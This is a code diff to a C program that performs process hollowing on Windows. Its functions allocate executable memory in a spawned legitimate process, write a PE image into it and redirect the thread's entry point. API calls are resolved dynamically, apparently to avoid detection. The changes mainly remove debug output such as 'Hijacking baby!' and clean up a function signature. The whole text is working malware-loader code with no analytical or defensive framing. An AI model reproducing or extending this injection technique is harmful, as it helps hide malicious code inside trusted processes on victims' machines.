@@ -51,7 +51,6 @@ int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT *newbase)
 {	
 	LPVOID			hijackRemote;
 	LPVOID			virtaddr;
-	PIMAGE_NT_HEADERS	nthdr;
 	UNMAPVIEWOFSECTION	unmapview;
 	VIRTUALALLOCEX		virtalloc;
 	WRITEPROCESSMEM		writeprocmem;
@@ -63,16 +62,8 @@ int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT *newbase)
 	if (!(virtalloc = (VIRTUALALLOCEX)resolve_symbol(&g_fonctions[8])))
                 return (0);
 	if (!(hijackRemote = virtalloc(rpi->hProcess, /*NULL*/rpeb->Reserved3[1], pe->nthdr.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
-	{
-		printf("Virtualalloc Fail\n");
                 return (0);
-	}
-	printf("Alloc succeed!\n");
 	*newbase = (CINT)rpeb->Reserved3[1];
-/*	*newbase = (CINT)hijackRemote;
-	nthdr = (PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)pe->buffer)->e_lfanew + pe->buffer);
-	nthdr->OptionalHeader.ImageBase = (CINT)hijackRemote;
-	printf("%p\n", nthdr->OptionalHeader.ImageBase);*/
 	if (!(writeprocmem = (WRITEPROCESSMEM)resolve_symbol(&g_fonctions[9])))
                 return (0);
 	if (!writeprocmem(rpi->hProcess, /*hijackRemote*/rpeb->Reserved3[1], pe->buffer, pe->nthdr.OptionalHeader.SizeOfHeaders, NULL))
@@ -89,7 +80,7 @@ int	hijack_legit(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT *newbase)
 	return (1);
 }
 
-int	set_new_eip(LPPROCESS_INFORMATION rpi, PEB *rpeb, t_pe *pe, CINT newbase)
+int	set_new_eip(LPPROCESS_INFORMATION rpi, t_pe *pe, CINT newbase)
 {
 	LPCONTEXT               rcontext;
 	GETTHREADCONTEXT        getthcontext;
@@ -124,10 +115,9 @@ int     process_hollow(WCHAR *legitproc, t_pe *pe)
 		return (0);
 	if ((remotepeb = get_remote_peb(pi->hProcess)))
 	{
-		printf("Hijacking baby!\n");
 		if (hijack_legit(pi, remotepeb, pe, &newbase))
 		{
-			if (set_new_eip(pi, remotepeb, pe, newbase))
+			if (set_new_eip(pi, pe, newbase))
 			{
 				debug_son(pi, (CINT)newbase/*remotepeb->Reserved3[1]*/);
 				free(pi);
